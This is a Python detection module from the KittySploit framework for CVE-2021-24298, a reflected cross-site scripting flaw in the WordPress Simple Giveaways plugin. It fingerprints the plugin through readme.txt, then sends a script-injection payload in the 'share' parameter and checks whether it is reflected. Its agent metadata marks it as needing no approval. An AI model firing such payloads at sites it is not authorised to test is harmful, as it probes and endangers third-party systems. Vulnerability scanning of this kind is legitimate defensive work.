#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Simple Giveaways plugin before 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Simple Giveaways <2.36.2 - Cross-Site Scripting Detection',
        'description': 'WordPress Simple Giveaways plugin before 2.36.2 contains a cross-site scripting vulnerability via the method and share GET parameters of the Giveaway pages, which are not sanitized, validated, or escaped before being output back in the pages.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'ibenic', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/2021/wp-plugin-giveasap-xss/',
            'https://wpscan.com/vulnerability/30aebded-3eb3-4dda-90b5-12de5e622c91',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24298',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24298',
    }

    def run(self):
        path = '/wp-content/plugins/giveasap/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('= Simple Giveaways',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Simple Giveaways <2.36.2 - Cross-Site Scripting detected', path=path)
            return True
        return False

